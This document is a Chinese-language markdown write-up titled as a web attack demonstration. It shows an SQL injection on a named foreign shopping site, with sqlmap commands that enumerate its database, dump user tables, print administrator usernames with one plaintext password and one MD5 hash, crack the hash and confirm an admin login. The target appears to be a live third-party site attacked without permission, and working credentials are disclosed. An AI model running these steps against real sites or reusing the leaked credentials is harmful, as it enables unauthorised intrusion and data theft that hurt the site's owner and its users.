---
title: web安全攻击演示
---

标签（空格分隔）： webSec

---

## 0x00 目标,境外站
```
http://www.atrium.com.pk/Shopping.php?ID=1
```

![](http://thyrsi.com/t6/365/1535803998x1822611383.png)

## 0x01 根据站的特点 .php?ID=1，尝试sql注入

![](http://thyrsi.com/t6/365/1535804411x-1404793184.jpg)

## 0x02 注入
### step1 工具
- sqlmap
- Ubuntu
  安装：sudo apt install sqlmap
### step2 注入
```
sqlmap -u http://www.atrium.com.pk/Shopping.php?ID=1
```
![](http://thyrsi.com/t6/365/1535805342x1822611437.jpg)
### step3 查数据库
```
sqlmap -u http://www.atrium.com.pk/Shopping.php?ID=1 --dbs --current-user 
```
![](http://thyrsi.com/t6/365/1535805503x-1404793154.jpg)
### step4 查表
```
sqlmap -u http://www.atrium.com.pk/Shopping.php?ID=1 -D  db738736812 --tables
```
```
Database: db738736812                                                                                                                      
[51 tables]
+--------------------------+
| about_website            |
| address                  |
| banners                  |
| bestsellers              |
| brands                   |
| categories               |
| daily_deal               |
| discount_coupons         |
| emails                   |
| entertainments           |
| events                   |
| feature_products         |
| features                 |
| footer_categories        |
| footer_links             |
| homeboxes                |
| infopages                |
| logos                    |
| mainbanners              |
| menu                     |
| middle_message           |
| multimedia               |
| newsletter_subscribers   |
| newsletters              |
| newsline                 |
| order_cancel_reasons     |
| order_status             |
| orders                   |
| other_countries_shipping |
| p_options                |
| p_options_values         |
| p_stocks                 |
| payment_methods          |
| product_options          |
| product_reviews          |
| products                 |
| roles                    |
| seo                      |
| shipping_rates           |
| shippings                |
| slider                   |
| sliders                  |
| socialmedia              |
| telephones               |
| thumbnails               |
| topbrands                |
| topmessage               |
| upsaleproducts           |
| user_groups              |
| users                    |
| website_users            |
+--------------------------+
```
### step5 查表的结构
```
sqlmap -u http://www.atrium.com.pk/Shopping.php?ID=1 -D  db738736812 -T users --columns
```
```
Table: users
[13 columns]
+--------------+------------+
| Column       | Type       |
+--------------+------------+
| Admin        | tinyint(1) |
| DateAdded    | datetime   |
| DateModified | datetime   |
| EmailAddress | text       |
| FirstName    | text       |
| ID           | int(11)    |
| LastName     | text       |
| Password     | text       |
| PerformedBy  | int(11)    |
| Role         | int(11)    |
| Status       | tinyint(1) |
| UserGroup    | tinyint(1) |
| UserName     | text       |
+--------------+------------+
```
### step6 脱库
```
sqlmap -u http://www.atrium.com.pk/Shopping.php?ID=1 -D  db738736812 -T website_users -C "Email,IP,Password,Successfull" --dump
```
![](http://thyrsi.com/t6/366/1535807070x-1376440138.jpg)

**有些密码是hash的需要Hash碰撞(社工库)**
```
sqlmap -u www.atrium.com.pk/Shopping.php?ID=1 -D  db738736812 -T users -C "Admin,EmailAddress,Password,UserName" --dump

Database: db738736812
Table: users
[2 entries]
+-------+--------------+----------------------------------+------------+
| Admin | EmailAddress | Password                         | UserName   |
+-------+--------------+----------------------------------+------------+
| 1     | <blank>      | c91ed8edc09b94e28ba6e827005eabb8 | Atrium786  |
| 1     | <blank>      | demo@123                         | Atrium1786 |
+-------+--------------+----------------------------------+------------+

```
```
http://www.dmd5.com/md5-decrypter.jsp

碰撞成功！

密文：c91ed8edc09b94e28ba6e827005eabb8

碰撞结果：Atriummallz@786

密文类型：md5

解密用时：1135毫秒
```

### step7 验证username 和password
```
http://www.atrium.com.pk/Login
```
登陆正确
![](http://thyrsi.com/t6/366/1535807368x-1404781240.jpg)

